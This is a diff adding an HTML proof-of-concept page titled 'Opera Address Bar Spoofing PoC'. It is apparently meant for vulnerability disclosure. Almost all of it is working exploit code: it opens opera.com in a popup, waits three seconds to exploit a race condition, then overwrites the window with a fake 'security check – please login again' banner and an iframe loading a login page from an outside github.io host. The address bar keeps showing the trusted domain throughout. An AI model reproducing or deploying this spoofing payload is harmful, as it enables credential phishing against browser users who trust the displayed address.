@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Opera Address Bar Spoofing PoC</title>
+
+<style>
+body{
+font-family:Arial;
+text-align:center;
+margin-top:80px;
+background:#f5f5f5;
+}
+
+button{
+padding:12px 20px;
+font-size:16px;
+cursor:pointer;
+}
+
+.note{
+color:red;
+font-size:13px;
+margin-bottom:10px;
+}
+
+iframe{
+width:100%;
+height:85vh;
+border:none;
+}
+
+.banner{
+background:#eeeeee;
+padding:10px;
+font-size:14px;
+border-bottom:1px solid #ccc;
+}
+</style>
+
+<script>
+
+function go(){
+
+// open trusted domain
+var win = window.open("https://www.opera.com");
+
+if(!win){
+alert("Popup blocked. Please allow popups.");
+return;
+}
+
+// race condition delay
+setTimeout(function(){
+
+try{
+
+win.document.open();
+
+win.document.write(`
+
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body{
+margin:0;
+font-family:Arial;
+background:white;
+}
+
+.banner{
+background:#f2f2f2;
+padding:12px;
+text-align:center;
+font-size:14px;
+border-bottom:1px solid #ccc;
+}
+
+iframe{
+width:100%;
+height:92vh;
+border:none;
+}
+</style>
+</head>
+
+<body>
+
+<div class="banner">
+⚠ opera.com security check – please login again
+</div>
+
+<p style="text-align:center;color:red;font-size:13px">
+Content below is attacker controlled while the address bar shows opera.com
+</p>
+
+<iframe src="https://cnfdnfial-ops.github.io/spoof/login.html"></iframe>
+
+</body>
+</html>
+
+`);
+
+win.document.close();
+
+}catch(e){
+
+console.log("Injection blocked:",e);
+
+}
+
+},3000);
+
+}
+
+</script>
+
+</head>
+
+<body>
+
+<h2>Opera Address Bar Spoofing PoC</h2>
+
+<p>
+This demonstration shows attacker-controlled content while the browser address bar displays a trusted domain.
+</p>
+
+<button onclick="go()">Start Test</button>
+
+</body>
+</html>
